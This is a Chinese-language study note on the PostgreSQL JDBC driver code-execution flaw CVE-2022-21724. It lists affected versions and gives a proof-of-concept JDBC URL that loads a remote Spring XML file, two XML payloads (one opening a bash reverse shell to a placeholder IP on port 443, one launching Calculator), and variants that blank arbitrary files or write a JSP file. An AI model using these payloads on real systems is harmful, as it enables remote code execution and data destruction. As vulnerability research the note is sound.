#  JDBC

## PostgreSQL 

学习：[PostgresQL JDBC Drive 任意代码执行漏洞(CVE-2022-21724)](https://xz.aliyun.com/t/11812)

### 影响范围

`9.4.1208 <=PgJDBC <42.2.25`

`42.3.0 <=PgJDBC < 42.3.2`

### poc（socketFactory/socketFactoryArg）

```java
        String driver = "org.postgresql.Driver";
        Class.forName(driver);
        String DB_URL = "jdbc:postgresql://node1/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://127.0.0.1:8080/exp.xml";
        Connection conn = DriverManager.getConnection(DB_URL);
```

文章很多都分析了就说点自己注意的点：（实例化`socketFactory`传入唯一一个参数`socketFactoryArg`）
![image-20221125183629413](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202211251836485.png)

也就是说这里可以实例化任意一个类。
![image-20221125183721466](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202211251837576.png)

那么这里如何构造这个参数呢？
在`org.postgresql.Driver#parseURL`中：
直接说逻辑了：
1、先通过`？`分割`DB_URL`

2、判断是否是`jdbc:postgresql:`开头（后续简单跟一下，来到urlArgs）

3、通过`&`进行分割存入String[]数组中，然后分别存入urlProps.setProperty。

#### xml

```
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="
 http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg >
        <list>
	    <value>/bin/sh</value>
            <value>-c</value>
            <value>bash -i &gt;&amp; /dev/tcp/ip/443 0&gt;&amp;1</value>
        </list>
        </constructor-arg>
    </bean>
</beans>
```

```
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="
 http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg >
        <list>
            <value>open</value>
            <value>-a</value>
	    <value>Calculator</value>
        </list>
        </constructor-arg>
    </bean>
</beans>
```

#### 其他利用

或者利用 FileOutputStream 将任意文件置空(`jdbc:postgresql://127.0.0.1:5432/test/?socketFactory=java.io.FileOutputStream&socketFactoryArg=test.txt`)

### poc（sslfactory/sslfactoryarg）

未复现成功（懒了 懒得去linux下弄了）

### poc（loggerLevel/loggerFile）

略。

```
      String DB_URL = "jdbc:postgresql://node1/test?loggerLevel=TRACE&loggerFile=hack.jsp";
```

需要其他组件配合。例如log4j。实战中利用可以注意的点是可以`目录穿越`

## 修复

https://xz.aliyun.com/t/11812#toc-4